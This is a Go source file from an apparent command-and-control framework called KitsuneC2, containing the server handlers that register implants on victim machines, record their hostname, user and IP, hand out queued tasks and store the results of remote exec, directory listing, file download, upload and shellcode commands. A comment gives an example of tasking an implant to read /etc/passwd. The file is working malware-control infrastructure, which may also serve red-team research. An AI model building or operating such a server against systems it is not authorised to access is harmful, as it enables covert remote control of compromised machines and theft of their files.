//This file contains all related functionality to handling incoming messages sent by implants.

package handlers

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/utils"
	"KitsuneC2/server/db"
	"KitsuneC2/server/transport"
	"encoding/json"
	"log"
	"net"
	"time"
)

// we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
// all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
	0: handleImplantRegister,
	1: handleCheckin,
	4: handleImplantErrorResp,
	//reserved for implant functionality
	12: handleFileInfoResp,
	14: handleLsResp,
	16: handleExecResp,
	18: handleCdResp,
	20: handleDownloadResp,
	22: handleUploadResp,
	24: handleShellcodeExecResp,
}

// This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
// done.
func TcpHandler(conn net.Conn) {
	defer conn.Close()
	messageType, data, session, err := transport.ReceiveEnvelopeFromImplant(conn)
	if err != nil {
		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
		return
	}

	handlerFunc := messageTypeToFunc[messageType]

	handlerFunc(session, data)
}

//-------------------Begin message handlers--------------------

// Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
func handleImplantRegister(sess *transport.Session, data interface{}) {
	implantRegister, ok := data.(*communication.ImplantRegister)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
		return
	}

	var dbEntry *db.Implant_info = new(db.Implant_info)
	dbEntry.Id = implantRegister.ImplantId
	dbEntry.Name = implantRegister.ImplantName
	dbEntry.Hostname = implantRegister.Hostname
	dbEntry.Username = implantRegister.Username
	dbEntry.Uid = implantRegister.UID
	dbEntry.Gid = implantRegister.GID
	dbEntry.Public_ip = sess.Connection.RemoteAddr().String()
	dbEntry.Last_checkin = int(time.Now().Unix())
	dbEntry.Os = ""   //TODO
	dbEntry.Arch = "" //TODO
	err := db.AddImplant(dbEntry)
	if err != nil {
		log.Printf("[ERROR] Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
		return
	}
	log.Printf("[INFO] Registered implant with ID: %s", implantRegister.ImplantId)
}

// Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
// the "data" variable is a string with the ID of an implant.
func handleCheckin(sess *transport.Session, data interface{}) {
	implantCheckin, ok := data.(*communication.ImplantCheckinReq)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
		return
	}
	err := db.UpdateLastCheckin(implantCheckin.ImplantId, int(time.Now().Unix()))
	if err != nil {
		log.Printf("[ERROR] could not update last checkin time of Implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
	}
	log.Printf("[INFO] Handling check-in from implant with ID: %s", implantCheckin.ImplantId)

	//The ImplantCheckinResp message is a special type of message in which we have to do some extra JSON marshalling. We create
	//an object containing 2 arrays. The first integer array contains the Tasktypes that we want the implant to perform. The
	//second 2d byte array contains the arguments for every task (byte[Tasknr][marshalled task arguments]). The implant will
	//unmarshal the 2d byte array based on the taskTypes provided in the first array.
	//Example: We want to send a FileInfoReq for /etc/passwd and /etc/hosts. We create 2 FileinfoReq objects containing all
	//necessary arguments {PathToFile: "/etc/passwd"} and {PathToFile: "/etc/passwd"} and its corresponding MessageType (11, 11).
	//The ImplantCheckinResp object will look as follows: {[11, 11], [0][json.Marshal(FileInfoReq1)]}
	//														.....	 [1][json.Marhsal(FileInfoReq2)]
	pendingTasks, err := db.GetTasks(implantCheckin.ImplantId, false)
	if err != nil {
		if err == db.ErrNoResults {
			log.Printf("[INFO] no pending tasks for implant with id: %s", implantCheckin.ImplantId)
		} else {
			log.Printf("[ERROR] Database error while fetching tasks for implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
		}
		return
	}
	req := new(communication.ImplantCheckinResp)
	req.TaskTypes = make([]int, len(pendingTasks))
	req.TaskArguments = make([][]byte, len(pendingTasks))
	for i := range pendingTasks {
		log.Printf("[INFO] Sending task with ID: %s to implant with ID: %s", pendingTasks[i].Task_id, implantCheckin.ImplantId)
		req.TaskTypes[i] = pendingTasks[i].Task_type
		req.TaskArguments[i] = []byte(pendingTasks[i].Task_data)
	}

	transport.SendEnvelopeToImplant(sess, 2, req)
}

// Handles enveloped with messageType==4. The implant send this message when execution of a module fails.
func handleImplantErrorResp(sess *transport.Session, data interface{}) {
	implantErrorResp, ok := data.(*communication.ImplantErrorResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=4 (ImplantErrorResp), but could not convert envelope data to ImplantErrorResp datastructure")
		return
	}
	marshalledRes, err := json.Marshal(implantErrorResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantErrorResp.TaskId, err.Error())
	}
	err = db.CompleteTask(implantErrorResp.TaskId, marshalledRes)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", implantErrorResp.TaskId, err.Error())
	}
}

//---------------Begin module handlers--------------------

// Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
func handleFileInfoResp(sess *transport.Session, data interface{}) {
	fileInfoResp, ok := data.(*communication.FileInfoResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=12 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
		return
	}
	marshalledResult, err := json.Marshal(fileInfoResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", fileInfoResp.TaskId, err.Error())
	}
	err = db.CompleteTask(fileInfoResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", fileInfoResp.TaskId, err.Error())
	}
}

func handleLsResp(sess *transport.Session, data interface{}) {
	lsResp, ok := data.(*communication.LsResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=14 (LsResp), but could not convert envelope data to LsResp datastructure")
		return
	}
	marshalledResult, err := json.Marshal(lsResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", lsResp.TaskId, err.Error())
	}
	err = db.CompleteTask(lsResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", lsResp.TaskId, err.Error())
	}
}

func handleExecResp(sess *transport.Session, data interface{}) {
	execResp, ok := data.(*communication.ExecResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=16 (ExecResp), but could not convert envelope data to ExecResp datastructure")
		return
	}
	marshalledResult, err := json.Marshal(execResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", execResp.TaskId, err.Error())
	}
	err = db.CompleteTask(execResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", execResp.TaskId, err.Error())
	}
}

func handleCdResp(sess *transport.Session, data interface{}) {
	cdResp, ok := data.(*communication.CdResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=18 (CdResp), but could not convert envelope data to CdResp datastructure")
		return
	}
	marshalledResult, err := json.Marshal(cdResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", cdResp.TaskId, err.Error())
	}
	err = db.CompleteTask(cdResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", cdResp.TaskId, err.Error())
	}
}

func handleDownloadResp(sess *transport.Session, data interface{}) {
	downloadResp, ok := data.(*communication.DownloadResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=14 (LsResp), but could not convert envelope data to LsResp datastructure")
		return
	}
	downloadReqEntry, err := db.GetTask(downloadResp.TaskId)
	if err != nil {
		log.Printf("[ERROR] While handling a download response, could not find original task that caused this response. Offending task ID: %s", downloadResp.TaskId)
		dbEntry, _ := json.Marshal("Could not find original task corresponding to this result. Discarded result.")
		db.CompleteTask(downloadResp.TaskId, dbEntry)
		return
	}
	downloadReq := new(communication.DownloadReq)
	err = json.Unmarshal(downloadReqEntry.Task_data, downloadReq)
	if err != nil {
		log.Printf("[ERROR] Could not unmarshal task with ID: %s back into its original structure while handling a download request.", downloadResp.TaskId)
		dbEntry, _ := json.Marshal("Original task corresponding to this result was corrupted. Discarded result.")
		db.CompleteTask(downloadReq.TaskId, dbEntry)
		return
	}

	err = utils.WriteFile(downloadResp.Contents, downloadReq.Destination)
	if err != nil {
		log.Printf("[ERROR] Could not write downloaded file to destination: %s. Reason: %s", downloadReq.Destination, err.Error())
		dbEntry, _ := json.Marshal("Could not write downloaded file to intended destination. Check logs for more info.")
		db.CompleteTask(downloadReq.TaskId, dbEntry)
	}

	dbEntry, _ := json.Marshal("Wrote file to: " + downloadReq.Destination)
	err = db.CompleteTask(downloadReq.TaskId, dbEntry)
	if err != nil {
		log.Printf("[Error] could not set task with ID: %s to complete status. Reason: %s", downloadReq.TaskId, err.Error())
	}
}

func handleUploadResp(sess *transport.Session, data interface{}) {
	uploadResp, ok := data.(*communication.UploadResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=22 (UploadResp), but could not convert envelope data to UploadResp datastructure")
		return
	}
	marshalledResult, err := json.Marshal(uploadResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", uploadResp.TaskId, err.Error())
	}
	err = db.CompleteTask(uploadResp.TaskId, marshalledResult)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", uploadResp.TaskId, err.Error())
	}
}

// TODO
func handleShellcodeExecResp(sess *transport.Session, data interface{}) {

}
